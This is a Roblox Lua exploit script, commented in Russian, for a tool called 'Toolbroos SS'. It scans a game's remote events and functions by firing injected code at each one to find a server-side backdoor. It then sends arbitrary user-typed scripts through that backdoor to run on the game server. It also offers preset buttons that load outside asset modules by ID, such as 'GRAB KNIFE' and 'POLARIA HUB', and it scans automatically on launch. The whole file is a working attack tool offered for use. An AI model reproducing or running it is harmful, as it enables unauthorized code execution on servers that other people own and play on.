local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

-- Упрощённые переменные
local LocalPlayer = Players.LocalPlayer
local RobloxGui = CoreGui:WaitForChild("RobloxGui", 10)

if not RobloxGui then
    error("RobloxGui not found!")
    return
end

-- Очистка предыдущего интерфейса
if RobloxGui:FindFirstChild("ToolbroosSS") then 
    RobloxGui:FindFirstChild("ToolbroosSS"):Destroy()
end

-- Цветовая схема
local NEON_COLORS = {
    Blue = Color3.fromRGB(0, 162, 255),
    Pink = Color3.fromRGB(255, 0, 162),
    Cyan = Color3.fromRGB(0, 255, 209),
    Purple = Color3.fromRGB(162, 0, 255),
    Yellow = Color3.fromRGB(255, 255, 0),
    Orange = Color3.fromRGB(255, 165, 0),
    Background = Color3.fromRGB(20, 20, 30),
    Dark = Color3.fromRGB(15, 15, 25)
}

-- Создание основного GUI
local ToolbroosSS = Instance.new("ScreenGui")
ToolbroosSS.Name = "ToolbroosSS"
ToolbroosSS.Parent = RobloxGui

-- Фоновый звук
local BackgroundSound = Instance.new("Sound")
BackgroundSound.Name = "BackgroundMusic"
BackgroundSound.SoundId = "rbxassetid://17422207260"
BackgroundSound.Volume = 1
BackgroundSound.Looped = true
BackgroundSound.Parent = ToolbroosSS

local MainFrame = Instance.new("Frame")
MainFrame.Name = "Main"
MainFrame.Size = UDim2.new(0, 450, 0, 320)
MainFrame.Position = UDim2.new(0.5, -225, 0.5, -160)
MainFrame.BackgroundColor3 = NEON_COLORS.Background
MainFrame.BackgroundTransparency = 0.1
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ToolbroosSS

-- Неоновое свечение
local Glow = Instance.new("ImageLabel")
Glow.Name = "Glow"
Glow.Size = UDim2.new(1, 20, 1, 20)
Glow.Position = UDim2.new(0, -10, 0, -10)
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://8992231221"
Glow.ImageColor3 = NEON_COLORS.Blue
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(100, 100, 100, 100)
Glow.Parent = MainFrame

-- Заголовок
local Topbar = Instance.new("Frame")
Topbar.Size = UDim2.new(1, 0, 0, 40)
Topbar.BackgroundColor3 = NEON_COLORS.Dark
Topbar.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Text = "TOOLBROOS SS - NEON EDITION"
Title.TextColor3 = NEON_COLORS.Cyan
Title.Font = Enum.Font.GothamBold
Title.Size = UDim2.new(0.7, 0, 1, 0)
Title.TextSize = 16
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Parent = Topbar

-- Кнопка звука
local SoundButton = Instance.new("TextButton")
SoundButton.Text = "🔊"
SoundButton.Size = UDim2.new(0, 40, 0, 40)
SoundButton.Position = UDim2.new(1, -80, 0, 0)
SoundButton.TextColor3 = Color3.new(1, 1, 1)
SoundButton.BackgroundColor3 = NEON_COLORS.Dark
SoundButton.Font = Enum.Font.GothamBold
SoundButton.TextSize = 18
SoundButton.Parent = Topbar

local CloseButton = Instance.new("TextButton")
CloseButton.Text = "✕"
CloseButton.Size = UDim2.new(0, 40, 0, 40)
CloseButton.Position = UDim2.new(1, -40, 0, 0)
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.BackgroundColor3 = NEON_COLORS.Dark
CloseButton.Font = Enum.Font.GothamBold
CloseButton.TextSize = 18
CloseButton.Parent = Topbar

-- Анимированная полоса
local NeonBar = Instance.new("Frame")
NeonBar.Size = UDim2.new(1, 0, 0, 3)
NeonBar.Position = UDim2.new(0, 0, 1, 0)
NeonBar.BackgroundColor3 = NEON_COLORS.Blue
NeonBar.BorderSizePixel = 0
NeonBar.Parent = Topbar

-- Анимация полосы
coroutine.wrap(function()
    while true do
        for i = 0, 1, 0.05 do
            NeonBar.BackgroundColor3 = NEON_COLORS.Blue:Lerp(NEON_COLORS.Pink, i)
            wait(0.05)
        end
        for i = 0, 1, 0.05 do
            NeonBar.BackgroundColor3 = NEON_COLORS.Pink:Lerp(NEON_COLORS.Purple, i)
            wait(0.05)
        end
        for i = 0, 1, 0.05 do
            NeonBar.BackgroundColor3 = NEON_COLORS.Purple:Lerp(NEON_COLORS.Cyan, i)
            wait(0.05)
        end
        for i = 0, 1, 0.05 do
            NeonBar.BackgroundColor3 = NEON_COLORS.Cyan:Lerp(NEON_COLORS.Blue, i)
            wait(0.05)
        end
    end
end)()

-- Основные кнопки (уменьшенные)
local ButtonsFrame = Instance.new("Frame")
ButtonsFrame.Size = UDim2.new(1, -20, 0, 30)
ButtonsFrame.Position = UDim2.new(0, 10, 0, 50)
ButtonsFrame.BackgroundTransparency = 1
ButtonsFrame.Parent = MainFrame

local ListLayout = Instance.new("UIListLayout")
ListLayout.FillDirection = Enum.FillDirection.Horizontal
ListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
ListLayout.Padding = UDim.new(0, 10)
ListLayout.Parent = ButtonsFrame

-- Создание кнопок
local function CreateNeonButton(name, color)
    local buttonContainer = Instance.new("Frame")
    buttonContainer.Size = UDim2.new(0.15, 0, 1, 0)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Parent = ButtonsFrame
    
    local btnGlow = Instance.new("ImageLabel")
    btnGlow.Size = UDim2.new(1, 8, 1, 8)
    btnGlow.Position = UDim2.new(0, -4, 0, -4)
    btnGlow.BackgroundTransparency = 1
    btnGlow.Image = "rbxassetid://8992231221"
    btnGlow.ImageColor3 = color
    btnGlow.ImageTransparency = 0.8
    btnGlow.ScaleType = Enum.ScaleType.Slice
    btnGlow.SliceCenter = Rect.new(100, 100, 100, 100)
    btnGlow.Parent = buttonContainer
    
    local btn = Instance.new("TextButton")
    btn.Text = name
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundColor3 = NEON_COLORS.Dark
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 10
    btn.BorderSizePixel = 0
    btn.Parent = buttonContainer
    
    btn.MouseEnter:Connect(function()
        TweenService:Create(btnGlow, TweenInfo.new(0.2), {ImageTransparency = 0.5}):Play()
    end)
    
    btn.MouseLeave:Connect(function()
        TweenService:Create(btnGlow, TweenInfo.new(0.2), {ImageTransparency = 0.8}):Play()
    end)
    
    return btn
end

-- Кнопки
local ScanButton = CreateNeonButton("SCAN", NEON_COLORS.Blue)
local ExecuteButton = CreateNeonButton("EXECUTE", NEON_COLORS.Pink)
local R6Button = CreateNeonButton("R6", NEON_COLORS.Purple)
local ClearButton = CreateNeonButton("CLEAR", NEON_COLORS.Cyan)
local ResetButton = CreateNeonButton("RE", NEON_COLORS.Yellow)
local SSScriptsButton = CreateNeonButton("SCRIPTS", NEON_COLORS.Orange)

-- Текстовое поле
local SourceBox = Instance.new("ScrollingFrame")
SourceBox.Size = UDim2.new(1, -20, 0, 170)
SourceBox.Position = UDim2.new(0, 10, 0, 90)
SourceBox.BackgroundColor3 = NEON_COLORS.Dark
SourceBox.BackgroundTransparency = 0.2
SourceBox.BorderSizePixel = 0
SourceBox.ScrollBarThickness = 5
SourceBox.CanvasSize = UDim2.new(0, 0, 2, 0)
SourceBox.Parent = MainFrame

local TextBox = Instance.new("TextBox")
TextBox.Size = UDim2.new(1, -10, 1, -10)
TextBox.Position = UDim2.new(0, 5, 0, 5)
TextBox.BackgroundTransparency = 1
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.Text = "-- Введите скрипт здесь --"
TextBox.Font = Enum.Font.Code
TextBox.TextSize = 12
TextBox.MultiLine = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top
TextBox.ClearTextOnFocus = false
TextBox.Parent = SourceBox

-- Бордер текстового поля
local BoxBorder = Instance.new("Frame")
BoxBorder.Size = UDim2.new(1, 0, 1, 0)
BoxBorder.BackgroundTransparency = 1
BoxBorder.BorderSizePixel = 2
BoxBorder.BorderColor3 = NEON_COLORS.Blue
BoxBorder.Parent = SourceBox

-- Анимация бордера
coroutine.wrap(function()
    while true do
        for i = 0, 1, 0.05 do
            BoxBorder.BorderColor3 = NEON_COLORS.Blue:Lerp(NEON_COLORS.Cyan, i)
            wait(0.1)
        end
        for i = 0, 1, 0.05 do
            BoxBorder.BorderColor3 = NEON_COLORS.Cyan:Lerp(NEON_COLORS.Blue, i)
            wait(0.1)
        end
    end
end)()

-- Статус
local StatusContainer = Instance.new("Frame")
StatusContainer.Size = UDim2.new(1, -20, 0, 25)
StatusContainer.Position = UDim2.new(0, 10, 1, -30)
StatusContainer.BackgroundColor3 = NEON_COLORS.Dark
StatusContainer.Parent = MainFrame

local Status = Instance.new("TextLabel")
Status.Text = "Status: Not Attached"
Status.TextColor3 = Color3.new(1, 0, 0)
Status.Size = UDim2.new(1, -10, 1, 0)
Status.Position = UDim2.new(0, 5, 0, 0)
Status.Font = Enum.Font.GothamBold
Status.TextSize = 12
Status.BackgroundTransparency = 1
Status.Parent = StatusContainer

local StatusLight = Instance.new("Frame")
StatusLight.Size = UDim2.new(0, 10, 0, 10)
StatusLight.Position = UDim2.new(1, -15, 0.5, -5)
StatusLight.BackgroundColor3 = Color3.new(1, 0, 0)
StatusLight.BorderSizePixel = 0
StatusLight.Parent = StatusContainer

-- Анимация статуса
coroutine.wrap(function()
    while true do
        TweenService:Create(StatusLight, TweenInfo.new(0.5), {BackgroundTransparency = 0.3}):Play()
        wait(0.5)
        TweenService:Create(StatusLight, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
        wait(0.5)
    end
end)()

-- Окно скриптов
local ScriptsWindow = Instance.new("Frame")
ScriptsWindow.Name = "ScriptsWindow"
ScriptsWindow.Size = UDim2.new(0, 400, 0, 300)
ScriptsWindow.Position = UDim2.new(0.5, -200, 0.5, -150)
ScriptsWindow.BackgroundColor3 = NEON_COLORS.Dark
ScriptsWindow.BackgroundTransparency = 0.05
ScriptsWindow.Visible = false
ScriptsWindow.Parent = ToolbroosSS

-- Неоновое свечение для окна
local WindowGlow = Glow:Clone()
WindowGlow.ImageColor3 = NEON_COLORS.Orange
WindowGlow.Parent = ScriptsWindow

-- Заголовок окна
local ScriptsTitle = Instance.new("TextLabel")
ScriptsTitle.Text = "SS SCRIPTS - PREBUILT"
ScriptsTitle.TextColor3 = NEON_COLORS.Cyan
ScriptsTitle.Font = Enum.Font.GothamBold
ScriptsTitle.Size = UDim2.new(1, 0, 0, 30)
ScriptsTitle.Position = UDim2.new(0, 0, 0, 10)
ScriptsTitle.BackgroundTransparency = 1
ScriptsTitle.Parent = ScriptsWindow

-- Кнопка закрытия
local CloseScriptsBtn = Instance.new("TextButton")
CloseScriptsBtn.Text = "✕"
CloseScriptsBtn.Size = UDim2.new(0, 30, 0, 30)
CloseScriptsBtn.Position = UDim2.new(1, -35, 0, 5)
CloseScriptsBtn.BackgroundTransparency = 1
CloseScriptsBtn.TextColor3 = Color3.new(1,1,1)
CloseScriptsBtn.Font = Enum.Font.GothamBold
CloseScriptsBtn.TextSize = 18
CloseScriptsBtn.Parent = ScriptsWindow

-- Контейнер для скриптов
local ScriptsList = Instance.new("ScrollingFrame")
ScriptsList.Size = UDim2.new(1, -20, 1, -60)
ScriptsList.Position = UDim2.new(0, 10, 0, 40)
ScriptsList.BackgroundTransparency = 1
ScriptsList.ScrollBarThickness = 8
ScriptsList.CanvasSize = UDim2.new(0, 0, 0, 0)
ScriptsList.Parent = ScriptsWindow

local ListLayoutScripts = Instance.new("UIListLayout")
ListLayoutScripts.Padding = UDim.new(0, 10)
ListLayoutScripts.Parent = ScriptsList

-- Функция добавления кнопок скриптов
local function AddScriptButton(name, scriptTemplate)
    local finalScript = string.gsub(scriptTemplate, "тут локальный ник", LocalPlayer.Name)
    
    local btn = Instance.new("TextButton")
    btn.Text = name
    btn.Size = UDim2.new(1, -10, 0, 40)
    btn.BackgroundColor3 = NEON_COLORS.Dark
    btn.TextColor3 = NEON_COLORS.Cyan
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 12
    btn.Parent = ScriptsList
    
    btn.MouseButton1Click:Connect(function()
        -- Копируем скрипт в основное поле
        TextBox.Text = finalScript
        
        -- Закрываем окно скриптов
        ScriptsWindow.Visible = false
        
        -- Автофокус на текстовом поле
        task.spawn(function()
            wait(0.1)
            TextBox:CaptureFocus()
        end)
        
        -- Подсветка кнопки EXECUTE
        local originalColor = ExecuteButton.BackgroundColor3
        TweenService:Create(ExecuteButton, TweenInfo.new(0.3), {BackgroundColor3 = NEON_COLORS.Pink}):Play()
        wait(0.5)
        TweenService:Create(ExecuteButton, TweenInfo.new(0.3), {BackgroundColor3 = originalColor}):Play()
        
        -- Уведомление
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Toolbroos SS",
            Text = "Скрипт скопирован!",
            Duration = 2
        })
    end)
    
    -- Авторазмер контейнера
    ListLayoutScripts:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        ScriptsList.CanvasSize = UDim2.new(0, 0, 0, ListLayoutScripts.AbsoluteContentSize.Y)
    end)
end

-- Добавляем ваши скрипты
AddScriptButton("GRAB KNIFE", [[require(18665717275).load("тут локальный ник")]])
AddScriptButton("POLARIA HUB", [[require(123255432303221):Pload("тут локальный ник")]])
AddScriptButton("SLEDGE HAMMER", [[require(8038037940).CLoad("тут локальный ник")]])
AddScriptButton("TOPK3K 5.0", [[require(0x342D5F0DA)("тут локальный ник")]])
AddScriptButton("SERVERSIDE.FUN", [[require(112500833342091).SFSS("тут локальный ник")]])

-- Основная логика
local attached = false
local backdoor = nil
local remoteCodes = {}
local STRING_VALUE_NAME = "ToolbroosSS_"..tostring(math.random(10000,99999))

local function Notify(text, color)
    color = color or NEON_COLORS.Blue
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Toolbroos SS",
        Text = text,
        Duration = 3,
        Icon = "rbxassetid://6726578263",
        Button1 = "OK"
    })
end

local function IsValidRemote(rm)
    if not rm:IsA("RemoteEvent") and not rm:IsA("RemoteFunction") then
        return false
    end
    
    if rm:IsDescendantOf(game:GetService("RobloxReplicatedStorage")) then
        return false
    end
    
    return true
end

local function ScanDescendants(parent)
    for _, descendant in ipairs(parent:GetDescendants()) do
        if not IsValidRemote(descendant) then continue end
        
        local remoteCode = tostring(math.random(100000, 999999))
        remoteCodes[remoteCode] = descendant
        
        local injectionScript = string.format(
            "local v = Instance.new('StringValue', workspace) v.Name = '%s' v.Value = '%s'",
            STRING_VALUE_NAME,
            remoteCode
        )
        
        if descendant:IsA("RemoteEvent") then
            descendant:FireServer(injectionScript)
        elseif descendant:IsA("RemoteFunction") then
            task.spawn(function()
                descendant:InvokeServer(injectionScript)
            end)
        end
        
        wait(0.1)
        
        local testObj = Workspace:FindFirstChild(STRING_VALUE_NAME)
        if testObj then
            attached = true
            backdoor = remoteCodes[testObj.Value]
            backdoor:FireServer(string.format("workspace['%s']:Destroy()", STRING_VALUE_NAME))
            Status.Text = "Status: Attached"
            Status.TextColor3 = Color3.new(0, 1, 0)
            StatusLight.BackgroundColor3 = Color3.new(0, 1, 0)
            return true
        end
    end
    return false
end

local function ScanGame()
    Status.Text = "Status: Scanning..."
    Status.TextColor3 = Color3.new(1, 1, 0)
    StatusLight.BackgroundColor3 = Color3.new(1, 1, 0)
    
    local locations = {
        ReplicatedStorage,
        Workspace,
        Lighting,
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage")
    }
    
    for _, location in ipairs(locations) do
        if ScanDescendants(location) then
            Notify("Backdoor attached!", NEON_COLORS.Cyan)
            return
        end
    end
    
    Notify("No backdoor found", NEON_COLORS.Pink)
    Status.Text = "Status: Failed"
    Status.TextColor3 = Color3.new(1, 0, 0)
    StatusLight.BackgroundColor3 = Color3.new(1, 0, 0)
end

-- Функция выполнения скрипта
local function ExecuteScript(script)
    if not attached then
        Notify("Not attached to backdoor!", NEON_COLORS.Pink)
        return
    end
    
    local protectedScript = [[
        local startTime = os.clock()
        local MAX_EXECUTION_TIME = 10
        
        local function safeExecute()
            ]] .. script .. [[
        end
        
        local success, err = pcall(safeExecute)
        
        if not success then
            warn("TOOLBROOS_ERROR: " .. tostring(err))
        elseif os.clock() - startTime > MAX_EXECUTION_TIME then
            warn("EXECUTION TIMEOUT: Script exceeded " .. MAX_EXECUTION_TIME .. " seconds")
        end
    ]]
    
    if backdoor:IsA("RemoteEvent") then
        backdoor:FireServer(protectedScript)
    else
        backdoor:InvokeServer(protectedScript)
    end
    Notify("Script executed", NEON_COLORS.Blue)
end

-- Обработчики кнопок
CloseButton.MouseButton1Click:Connect(function()
    TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
    wait(0.3)
    BackgroundSound:Stop()
    ToolbroosSS:Destroy()
end)

-- Обработчик звука
local soundEnabled = true
SoundButton.MouseButton1Click:Connect(function()
    soundEnabled = not soundEnabled
    
    if soundEnabled then
        SoundButton.Text = "🔊"
        BackgroundSound:Play()
    else
        SoundButton.Text = "🔇"
        BackgroundSound:Pause()
    end
end)

ScanButton.MouseButton1Click:Connect(function()
    ScanGame()
end)

ExecuteButton.MouseButton1Click:Connect(function()
    ExecuteScript(TextBox.Text)
end)

-- 🔥🔥🔥 ИСПРАВЛЕННАЯ КНОПКА R6 🔥🔥🔥
R6Button.MouseButton1Click:Connect(function()
    local originalText = R6Button.Text
    R6Button.Text = "WORKING..."
    
    local conversionScript = [[
        local player = game:GetService("Players").LocalPlayer
        
        -- Метод 1: Официальное API
        local function Method1()
            return pcall(function()
                game:GetService("StarterGui"):SetCore("PromptR6Conversion", player)
            end)
        end
        
        -- Метод 2: Прямое изменение рига
        local function Method2()
            if not player.Character then
                player:LoadCharacter()
                task.wait(1)
            end
            
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.RigType == Enum.HumanoidRigType.R15 then
                humanoid:ChangeRigType(Enum.HumanoidRigType.R6)
                return true
            end
            return false
        end
        
        -- Пробуем методы
        if not Method1() then
            task.wait(0.5)
            Method2()
        end
    ]]
    
    ExecuteScript(conversionScript)
    
    delay(2, function()
        R6Button.Text = originalText
    end)
end)

ClearButton.MouseButton1Click:Connect(function()
    TextBox.Text = ""
end)

-- RE кнопка
ResetButton.MouseButton1Click:Connect(function()
    local originalText = ResetButton.Text
    ResetButton.Text = "RESETTING..."
    
    local function ResetCharacter()
        if LocalPlayer.Character then
            LocalPlayer.Character:BreakJoints()
        else
            LocalPlayer:LoadCharacter()
        end
    end
    
    local success, err = pcall(ResetCharacter)
    
    if success then
        Notify("Character reset!", NEON_COLORS.Yellow)
    else
        Notify("Reset failed: "..tostring(err), NEON_COLORS.Pink)
    end
    
    delay(1.5, function()
        ResetButton.Text = originalText
    end)
end)

-- Обработчик кнопки SS SCRIPTS
SSScriptsButton.MouseButton1Click:Connect(function()
    ScriptsWindow.Visible = not ScriptsWindow.Visible
end)

-- Обработчик закрытия окна скриптов
CloseScriptsBtn.MouseButton1Click:Connect(function()
    ScriptsWindow.Visible = false
end)

-- Автосканирование при запуске
task.spawn(function()
    wait(1)
    TweenService:Create(MainFrame, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -225, 0.5, -160)}):Play()
    wait(0.5)
    BackgroundSound:Play()
    ScanGame()
end)